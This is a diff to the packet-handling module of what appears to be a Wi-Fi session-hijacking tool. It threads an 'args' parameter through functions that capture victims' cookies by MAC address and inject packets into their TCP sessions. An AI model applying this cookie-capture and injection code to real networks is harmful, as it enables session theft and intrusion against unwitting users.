@@ -5,7 +5,7 @@ import binascii, fcntl, gzip, socket, struct, sys, time
 from lib.injector import *
 from lib.victim import *
 
-class PacketHandler:
+class PacketHandler(object):
 	'''This class does all the heavy-lifting.
 	
 	It has an optional Victims parameter that is a List of instances of Victims for targeted mode.
@@ -192,7 +192,7 @@ class PacketHandler:
 
 	### Reword docstring
 	### Not sure if the above was mine or your comment, if mine, delete...
-	def cookie_mgmt(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie):
+	def cookie_mgmt(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args):
 		'''This function does cookie management for broadcast mode and targeted mode.
 	
 		A new mode is also added that can work in both broadcast
@@ -276,7 +276,7 @@ class PacketHandler:
 						if (victim.mac is not None):
 							if (victim.mac.lower() == vicmac.lower()):
 								vic_in_targets = 1
-								victim.add_cookie(cookie)
+								victim.add_cookie(cookie, args)
 
 			else:
 				if (cookie[0] is not None and cookie[1] is None):
@@ -292,7 +292,7 @@ class PacketHandler:
 						else:
 							if (victim.mac is not None):
 								if (victim.mac.lower() == vicmac.lower()):
-									victim.add_cookie(cookie)
+									victim.add_cookie(cookie, args)
 									vic_in_targets = 1
 
 			## IF VIC IS IN TARGETS, RETURN
@@ -538,7 +538,7 @@ class PacketHandler:
 								self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
 
 
-	def process(self, interface, pkt, single):
+	def process(self, interface, pkt, single, args):
 		'''Process packets coming from the sniffer.
 		
 		You can override the handler with one of your own,
@@ -557,5 +557,5 @@ class PacketHandler:
 			except:
 				return
 
-			self.cookie_mgmt(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
+			self.cookie_mgmt(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args)
 			self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, single)
